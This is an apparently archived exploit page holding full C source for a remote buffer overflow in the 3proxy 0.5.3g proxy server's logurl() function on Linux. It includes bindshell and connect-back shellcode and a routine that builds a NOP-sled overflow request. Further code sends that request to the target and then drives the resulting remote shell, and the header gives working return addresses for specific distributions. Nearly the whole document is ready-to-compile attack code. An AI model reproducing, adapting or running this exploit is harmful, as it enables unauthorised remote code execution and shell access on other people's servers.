<html><head><title>3proxy 0.5.3g proxy.c logurl() Remote Buffer Overflow Exploit (linux)</title></head><pre>/*[ 3proxy[v0.5.3g]: (linux) remote buffer overflow exploit. ]***
  *                                                             *
  * by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)            *
  *                                                             *
  * compile:                                                    *
  *  gcc x3proxy.c -o x3proxy                                   *
  *                                                             *
  * syntax:                                                     *
  *  ./x3proxy [-pscr+] -h host                                 *
  *                                                             *
  * sumus homepage/url:                                         *
  *  http://3proxy.ru/                                          *
  *                                                             *
  * 3Proxy tiny free proxy server previously known as 3[APA3A]  *
  * tiny freeware proxy.                                        *
  *                                                             *
  * I just saw a (gentoo) advisory, and got curious how easy    *
  * it would be to exploit this.  The vulnerability is fairly   *
  * trival:                                                     *
  *                                                             *
  * ----------------------------------------------------------- *
  * GET /[NOPS][SHELLCODE][RETADDR]\n                           *
  * Host: [FILLER]\n\n                                          *
  * ----------------------------------------------------------- *
  *                                                             *
  * The length of &quot;Host: [FILLER]&quot; is exactly how many bytes    *
  * past the buffer boundary it will go, if it's not there it   *
  * won't overflow.  The vulnerability can be found in proxy.c  *
  * in the logurl() function. (buf[LINESIZE])                   *
  *                                                             *
  * I didn't work out a common place to find the shellcode in   *
  * memory.  but, the following values(-r option) worked for    *
  * me:                                                         *
  *  0x0805333c (gentoo/r2 0.5.3g src compile)                  *
  *  0x08054da8 (mandrake 0.5.3g src compile)                   *
  *                                                             *
  * It will probably be easiest to run through a debugger and   *
  * find where the address of the shellcode is.  (offsets of    *
  * around 1500 when brute guessing)                            *
  ***************************************************************/
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#ifndef __USE_BSD
#define __USE_BSD
#endif
#include &lt;string.h&gt;
#include &lt;strings.h&gt;
#include &lt;signal.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netdb.h&gt;
#include &lt;getopt.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;

#define BUFSIZE 2200
#define TIMEOUT 10
#define DFL_PORT 3128
#define DFL_SPORT 7979
#define DFL_RETADDR 0x08048004

/* globals. */
static char x86_bind[]= /* bindshell, from netric. */
 &quot;\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1\xb0\x66&quot;
 &quot;\xcd\x80\x31\xd2\x52\x66\x68\xff\xff\x43\x66\x53\x89&quot;
 &quot;\xe1\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd\x80\x40\x89&quot;
 &quot;\x44\x24\x04\x43\x43\xb0\x66\xcd\x80\x83\xc4\x0c\x52&quot;
 &quot;\x52\x43\xb0\x66\xcd\x80\x93\x89\xd1\xb0\x3f\xcd\x80&quot;
 &quot;\x41\x80\xf9\x03\x75\xf6\x52\x68\x6e\x2f\x73\x68\x68&quot;
 &quot;\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd&quot;
 &quot;\x80&quot;;
static char x86_conn[]= /* connect-back, eSDee/netric. */
 &quot;\x31\xc0\x31\xdb\x31\xc9\x51\xb1\x06\x51\xb1\x01\x51&quot;
 &quot;\xb1\x02\x51\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc2&quot;
 &quot;\x31\xc0\x31\xc9\x51\x51\x68\xff\xff\xff\xff\x66\x68&quot;
 &quot;\xff\xff\xb1\x02\x66\x51\x89\xe7\xb3\x10\x53\x57\x52&quot;
 &quot;\x89\xe1\xb3\x03\xb0\x66\xcd\x80\x31\xc9\x39\xc1\x74&quot;
 &quot;\x06\x31\xc0\xb0\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xd3&quot;
 &quot;\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\xb1\x01\xcd\x80\x31&quot;
 &quot;\xc0\xb0\x3f\x89\xd3\xb1\x02\xcd\x80\x31\xc0\x31\xd2&quot;
 &quot;\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3&quot;
 &quot;\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd&quot;
 &quot;\x80&quot;;
char *x86_ptr;
struct{
 unsigned int addr;
 signed int off;
 char *host;
 unsigned short port;
 unsigned short sport;
}tbl;

/* lonely extern. */
extern char *optarg;

/* functions. */
char *getbuf(unsigned int);
unsigned short proxy_connect(char *,unsigned short);
signed int getshell_bind_init(unsigned short);
signed int getshell_bind_accept(signed int);
signed int getshell_conn(char *,unsigned short);
void proc_shell(signed int);
void printe(char *,short);
void usage(char *);
void sig_alarm(){printe(&quot;alarm/timeout hit.&quot;,1);}

/* start. */
int main(int argc,char **argv){
 signed int chr=0,rsock=0;
 unsigned int bs=0;
 struct hostent *t;
 in_addr_t s=0;
 printf(&quot;[*] 3proxy[v0.5.3g]: (linux) remote buffer overflow explo&quot;
 &quot;it.\n[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)\n\n&quot;);
 tbl.port=DFL_PORT;
 tbl.sport=DFL_SPORT;
 tbl.addr=DFL_RETADDR;

 while((chr=getopt(argc,argv,&quot;h:p:s:c:r:+:&quot;))!=EOF){
  switch(chr){
   case 'h':
    if(!tbl.host&amp;&amp;!(tbl.host=(char *)strdup(optarg)))
     printe(&quot;main(): allocating memory failed&quot;,1);  
    break;
   case 'p':
    tbl.port=atoi(optarg);
    break;
   case 's':
    tbl.sport=atoi(optarg);
    break;
   case 'c':
    if((s=inet_addr(optarg))){
     if((t=gethostbyname(optarg)))
      memcpy((char *)&amp;s,(char *)t-&gt;h_addr,sizeof(s));
     if(s==-1)s=0;
     if(!s)printe(&quot;invalid host/ip. (-c option)&quot;,0);
    }
    break;
   case 'r':
    sscanf(optarg,&quot;%x&quot;,&amp;tbl.addr);
    break;
   case '+':
    tbl.off=atoi(optarg);
    break;
   default:
    usage(argv[0]);
    break;
  }
 }
 if(!tbl.host)usage(argv[0]);

 /* set bind port for shellcode. */
 if(!s){
  bs=strlen(x86_bind);
  x86_bind[20]=(tbl.sport&amp;0xff00)&gt;&gt;8;
  x86_bind[21]=(tbl.sport&amp;0x00ff);
  x86_ptr=x86_bind;
 }
 /* set connect-back ip/port for shellcode. */
 else{
  bs=strlen(x86_conn);
  x86_conn[33]=(s&amp;0x000000ff);
  x86_conn[34]=(s&amp;0x0000ff00)&gt;&gt;8;
  x86_conn[35]=(s&amp;0x00ff0000)&gt;&gt;16;
  x86_conn[36]=(s&amp;0xff000000)&gt;&gt;24;
  x86_conn[39]=(tbl.sport&amp;0xff00)&gt;&gt;8;
  x86_conn[40]=(tbl.sport&amp;0x00ff);
  x86_ptr=x86_conn;
 }
 if(bs!=strlen(x86_ptr))
  printe(&quot;ip(-c option) and/or port(-s option) appear to contain a &quot;
  &quot;null-byte, try again.&quot;,1);

 printf(&quot;[*] target\t\t\t: %s:%d\n&quot;,tbl.host,tbl.port);
 printf(&quot;[*] shellcode type\t\t: %s(port=%d)\n&quot;,
 (s?&quot;connect-back&quot;:&quot;bindshell&quot;),tbl.sport);
 printf(&quot;[*] return address($eip)\t: 0x%.8x(+%d=0x%.8x)\n&quot;,tbl.addr,
 tbl.off,tbl.addr+tbl.off);

 if(s){
  rsock=getshell_bind_init(tbl.sport);
  proxy_connect(tbl.host,tbl.port);
  rsock=getshell_bind_accept(rsock);
 }
 else{
  proxy_connect(tbl.host,tbl.port);
  rsock=getshell_conn(tbl.host,tbl.sport);
 }
 if(rsock&gt;0)proc_shell(rsock);
 exit(0);
}

/* make buf: &quot;GET /[NOPS][SHELLCODE][RETADDR]\nHost: [FILLER]\n\n&quot; */
char *getbuf(unsigned int addr){
 unsigned int i=0;
 char *buf;
 if(!(buf=(char *)malloc(BUFSIZE+1)))
  printe(&quot;getbuf(): allocating memory failed.&quot;,1);
 strcpy(buf,&quot;GET /&quot;);
 memset(buf+5,'\x90',1800);
 strcat(buf,x86_ptr);
 for(i=strlen(buf);i&lt;2100;i+=4){
  *(long *)&amp;buf[i]=addr;
 }
 strcat(buf,&quot;\nHost: &quot;);
 memset(buf+strlen(buf),'x',(BUFSIZE-strlen(buf)-3-2));
 strcat(buf,&quot;\n\n&quot;);
 return(buf);
}

/* connects to the vulnerable 3proxy server. */
unsigned short proxy_connect(char *hostname,unsigned short port){
 signed int sock;
 struct hostent *t;
 struct sockaddr_in s;
 sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
 s.sin_family=AF_INET;
 s.sin_port=htons(port);
 printf(&quot;[*] attempting to connect: %s:%d.\n&quot;,hostname,port);
 if((s.sin_addr.s_addr=inet_addr(hostname))){
  if(!(t=gethostbyname(hostname)))
   printe(&quot;couldn't resolve hostname.&quot;,1);
  memcpy((char *)&amp;s.sin_addr,(char *)t-&gt;h_addr,sizeof(s.sin_addr));
 }
 signal(SIGALRM,sig_alarm);
 alarm(TIMEOUT);
 if(connect(sock,(struct sockaddr *)&amp;s,sizeof(s)))
  printe(&quot;3proxy connection failed.&quot;,1);
 alarm(0);
 printf(&quot;[*] successfully connected: %s:%d.\n&quot;,hostname,port);
 sleep(1);
 printf(&quot;[*] sending string: \&quot;GET /[NOPS][SHELLCODE][RETADDR]&quot;
 &quot;\\nHost: [FILLER]\\n\\n\&quot;\n&quot;);
 write(sock,getbuf(tbl.addr+tbl.off),BUFSIZE);
 sleep(1);
 printf(&quot;[*] closing connection.\n\n&quot;);
 close(sock);
 return(0);
}

/* binds locally for connect-back. */
signed int getshell_bind_init(unsigned short port){
 signed int ssock=0,so=1;
 struct sockaddr_in ssa;
 ssock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
 setsockopt(ssock,SOL_SOCKET,SO_REUSEADDR,(void *)&amp;so,sizeof(so));
#ifdef SO_REUSEPORT
 setsockopt(ssock,SOL_SOCKET,SO_REUSEPORT,(void *)&amp;so,sizeof(so));
#endif
 ssa.sin_family=AF_INET;
 ssa.sin_port=htons(port);
 ssa.sin_addr.s_addr=INADDR_ANY;
 if(bind(ssock,(struct sockaddr *)&amp;ssa,sizeof(ssa))==-1)
  printe(&quot;could not bind socket.&quot;,1);
 listen(ssock,1); 
 return(ssock);
}

/* accepts locally for connect-back. */
signed int getshell_bind_accept(signed int ssock){
 signed int sock=0;
 unsigned int salen=0;
 struct sockaddr_in sa;
 memset((char*)&amp;sa,0,sizeof(struct sockaddr_in));
 salen=sizeof(sa);
 printf(&quot;[*] awaiting connection from: *:%d.\n&quot;,tbl.sport);
 alarm(TIMEOUT);
 sock=accept(ssock,(struct sockaddr *)&amp;sa,&amp;salen);
 alarm(0);
 close(ssock);
 printf(&quot;[*] connection established. (connect-back)\n&quot;);
 return(sock);
}

/* connects to bindshell. */
signed int getshell_conn(char *hostname,unsigned short port){
 signed int sock=0;
 struct hostent *he;
 struct sockaddr_in sa;
 if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
  printe(&quot;getshell_conn(): socket() failed.&quot;,1);
 sa.sin_family=AF_INET;
 if((sa.sin_addr.s_addr=inet_addr(hostname))){
  if(!(he=gethostbyname(hostname)))
   printe(&quot;getshell_conn(): couldn't resolve.&quot;,1);
  memcpy((char *)&amp;sa.sin_addr,(char *)he-&gt;h_addr,
  sizeof(sa.sin_addr));
 }
 sa.sin_port=htons(port);
 signal(SIGALRM,sig_alarm);
 printf(&quot;[*] attempting to connect: %s:%d.\n&quot;,hostname,port);
 alarm(TIMEOUT);
 if(connect(sock,(struct sockaddr *)&amp;sa,sizeof(sa))){
  printf(&quot;[!] connection failed: %s:%d.\n&quot;,hostname,port);
  exit(1);
 }
 alarm(0);
 printf(&quot;[*] successfully connected: %s:%d.\n\n&quot;,hostname,port);
 return(sock);
}

/* process the bind/connect-back shell. */
void proc_shell(signed int sock){
 signed int r=0;
 char buf[4096+1];
 fd_set fds;
 signal(SIGINT,SIG_IGN);
 write(sock,&quot;uname -a;id\n&quot;,13);
 while(1){
  FD_ZERO(&amp;fds);
  FD_SET(0,&amp;fds);
  FD_SET(sock,&amp;fds);
  if(select(sock+1,&amp;fds,0,0,0)&lt;1)
   printe(&quot;getshell(): select() failed.&quot;,1);
  if(FD_ISSET(0,&amp;fds)){
   if((r=read(0,buf,4096))&lt;1)
    printe(&quot;getshell(): read() failed.&quot;,1);
   if(write(sock,buf,r)!=r)
    printe(&quot;getshell(): write() failed.&quot;,1);
  }
  if(FD_ISSET(sock,&amp;fds)){
   if((r=read(sock,buf,4096))&lt;1)exit(0);
   write(1,buf,r);
  }
 }
 close(sock);
 return;
}

/* error! */
void printe(char *err,short e){
 printf(&quot;[!] %s\n&quot;,err);
 if(e)exit(1);
 return;
}

/* usage. */
void usage(char *progname){
 printf(&quot;syntax: %s [-pscr+] -h host\n\n&quot;,progname);
 printf(&quot;  -h &lt;host/ip&gt;\ttarget hostname/ip.\n&quot;);
 printf(&quot;  -p &lt;port&gt;\ttarget port.\n&quot;);
 printf(&quot;  -s &lt;port&gt;\tconnect-back/bind port. (shellcode)\n&quot;);
 printf(&quot;  -c &lt;host/ip&gt;\tconnect-back host/ip. (enables &quot;
 &quot;connect-back)\n&quot;);
 printf(&quot;  -r &lt;addr&gt;\tdefine return address. (0x%.8x)\n&quot;,tbl.addr);
 printf(&quot;  -+ &lt;offset&gt;\tadds to the -r option address.\n\n&quot;);
 exit(0);
}

// milw0rm.com [2007-04-30]</pre></html>